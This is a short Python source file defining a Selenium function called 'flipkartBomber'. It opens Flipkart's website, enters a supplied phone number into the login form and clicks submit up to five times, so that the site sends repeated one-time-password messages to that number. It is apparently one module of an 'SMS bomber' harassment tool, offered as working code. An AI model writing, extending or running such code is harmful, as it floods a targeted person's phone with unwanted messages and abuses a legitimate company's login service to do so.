import time

# Flipkart Bomber
def flipkartBomber(browser, phoneNumber, attempts=5):
    for i in range(min(attempts, 5)):
        try:
            browser.get("https://www.flipkart.com/")

            # Waiting for the page to load
            time.sleep(2)

            # Selecting the input field
            inPut = browser.find_element_by_xpath(
                "//form[@autocomplete='on']/div[1]/input"
            )
            inPut.send_keys(phoneNumber)

            # Clicking the submit button
            cLick = browser.find_element_by_xpath(
                "//form[@autocomplete='on']/div[5]/button"
            )
            cLick.click()

        except:
            print("Something went wrong in Flipkart Bomber")

        finally:
            # Waiting so that one request completes
            time.sleep(5)